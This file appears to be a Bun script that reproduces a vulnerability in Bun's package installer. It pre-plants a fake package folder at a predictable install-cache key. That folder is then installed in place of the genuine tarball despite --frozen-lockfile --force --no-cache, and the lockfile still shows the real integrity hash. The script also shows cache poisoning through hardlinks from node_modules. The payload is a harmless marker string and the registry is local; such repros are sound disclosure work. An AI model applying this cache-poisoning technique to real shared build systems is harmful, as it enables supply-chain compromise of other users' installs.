#!/usr/bin/env bun
// Repro: pre-planted install cache folder survives --frozen-lockfile --force --no-cache,
// tarball is never fetched, bun.lock records registry's genuine integrity for bytes that
// never crossed the wire.

import { mkdirSync, writeFileSync, readFileSync, existsSync, rmSync, statSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { createHash } from "node:crypto";
import { gzipSync } from "node:zlib";

const BUN = process.env.BUN_EXE ?? process.execPath;

// ─── build a genuine tarball for the registry to serve ───────────────────────
function tarEntry(name: string, body: string): Buffer {
  const header = Buffer.alloc(512);
  header.write(name, 0, "utf8");
  header.write("000644 \0", 100);
  header.write("000000 \0", 108);
  header.write("000000 \0", 116);
  header.write(body.length.toString(8).padStart(6, "0") + " \0", 124);
  header.write(Math.floor(Date.now() / 1000).toString(8).padStart(11, "0") + " ", 136);
  header.write("        ", 148); // chksum placeholder
  header.write("0", 156);
  header.write("ustar\0", 257);
  header.write("00", 263);
  let sum = 0;
  for (let i = 0; i < 512; i++) sum += header[i];
  header.write(sum.toString(8).padStart(6, "0") + "\0 ", 148);
  const bodyBuf = Buffer.from(body, "utf8");
  const pad = Buffer.alloc((512 - (bodyBuf.length % 512)) % 512);
  return Buffer.concat([header, bodyBuf, pad]);
}
const genuineIndex = `module.exports = "GENUINE";\n`;
const tar = Buffer.concat([
  tarEntry("package/package.json", JSON.stringify({ name: "victim-pkg", version: "1.0.0", main: "index.js" })),
  tarEntry("package/index.js", genuineIndex),
  Buffer.alloc(1024),
]);
const tgz = gzipSync(tar);
const integrity = "sha512-" + createHash("sha512").update(tgz).digest("base64");

// ─── registry that counts manifest + tarball hits separately ─────────────────
let manifestHits = 0;
let tarballHits = 0;
const server = Bun.serve({
  port: 0,
  fetch(req) {
    const url = new URL(req.url);
    if (url.pathname === "/victim-pkg") {
      manifestHits++;
      return Response.json({
        name: "victim-pkg",
        "dist-tags": { latest: "1.0.0" },
        versions: {
          "1.0.0": {
            name: "victim-pkg",
            version: "1.0.0",
            dist: {
              tarball: `http://localhost:${server.port}/victim-pkg/-/victim-pkg-1.0.0.tgz`,
              integrity,
            },
          },
        },
      });
    }
    if (url.pathname === "/victim-pkg/-/victim-pkg-1.0.0.tgz") {
      tarballHits++;
      return new Response(tgz, { headers: { "content-type": "application/octet-stream" } });
    }
    return new Response("404", { status: 404 });
  },
});

// ─── isolated dirs ───────────────────────────────────────────────────────────
const root = join(tmpdir(), "bun-cache-poison-" + Date.now());
const cacheDir = join(root, "cache");
const projDir = join(root, "proj");
mkdirSync(projDir, { recursive: true });

// tenant A: pre-plant poisoned folder at predictable key
// (with a custom registry the key carries @@<hostname>; with default npmjs it is just name@ver@@@1)
const poisonDir = join(cacheDir, "victim-pkg@1.0.0@@localhost@@@1");
mkdirSync(poisonDir, { recursive: true });
writeFileSync(join(poisonDir, "package.json"), JSON.stringify({ name: "victim-pkg", version: "1.0.0", main: "index.js" }));
writeFileSync(join(poisonDir, "index.js"), `module.exports = "POISONED";\n`);

// tenant B: normal project
writeFileSync(
  join(projDir, "package.json"),
  JSON.stringify({ name: "victim", version: "0.0.0", dependencies: { "victim-pkg": "1.0.0" } }),
);
writeFileSync(
  join(projDir, "bunfig.toml"),
  `[install]\nregistry = "http://localhost:${server.port}/"\n`,
);

const env = {
  ...process.env,
  BUN_INSTALL_CACHE_DIR: cacheDir,
  BUN_DEBUG_QUIET_LOGS: "1",
};

async function run(args: string[]) {
  const proc = Bun.spawn({
    cmd: [BUN, "install", ...args],
    cwd: projDir,
    env,
    stdout: "pipe",
    stderr: "pipe",
  });
  const [out, err, code] = await Promise.all([proc.stdout.text(), proc.stderr.text(), proc.exited]);
  return { out, err, code };
}

console.log(`registry integrity: ${integrity}`);
console.log();

// ─── first install: fresh, writes bun.lock ───────────────────────────────────
{
  const r = await run(["--no-cache"]);
  console.log(`[install --no-cache] exit=${r.code} manifestHits=${manifestHits} tarballHits=${tarballHits}`);
  const installed = readFileSync(join(projDir, "node_modules", "victim-pkg", "index.js"), "utf8");
  console.log(`  node_modules/victim-pkg/index.js => ${JSON.stringify(installed.trim())}`);
  const lock = readFileSync(join(projDir, "bun.lock"), "utf8");
  const hasGenuineIntegrity = lock.includes(integrity);
  console.log(`  bun.lock contains genuine registry integrity: ${hasGenuineIntegrity}`);
}

// ─── second install: full paranoid flags ─────────────────────────────────────
rmSync(join(projDir, "node_modules"), { recursive: true, force: true });
manifestHits = 0;
tarballHits = 0;
{
  const r = await run(["--frozen-lockfile", "--force", "--no-cache"]);
  console.log();
  console.log(`[install --frozen-lockfile --force --no-cache] exit=${r.code} manifestHits=${manifestHits} tarballHits=${tarballHits}`);
  const installed = readFileSync(join(projDir, "node_modules", "victim-pkg", "index.js"), "utf8");
  console.log(`  node_modules/victim-pkg/index.js => ${JSON.stringify(installed.trim())}`);
}

// ─── hardlink backchannel: node_modules edit poisons cache ───────────────────
const nmFile = join(projDir, "node_modules", "victim-pkg", "index.js");
const cacheFile = join(poisonDir, "index.js");
const nmStat = statSync(nmFile);
const cacheStat = statSync(cacheFile);
console.log();
console.log(`[hardlink] node_modules inode=${nmStat.ino} cache inode=${cacheStat.ino} same=${nmStat.ino === cacheStat.ino}`);
if (nmStat.ino === cacheStat.ino) {
  writeFileSync(nmFile, `module.exports = "POISONED-VIA-NODE_MODULES";\n`);
  console.log(`  after writing node_modules file, cache file reads: ${JSON.stringify(readFileSync(cacheFile, "utf8").trim())}`);
}

server.stop(true);
// keep for inspection
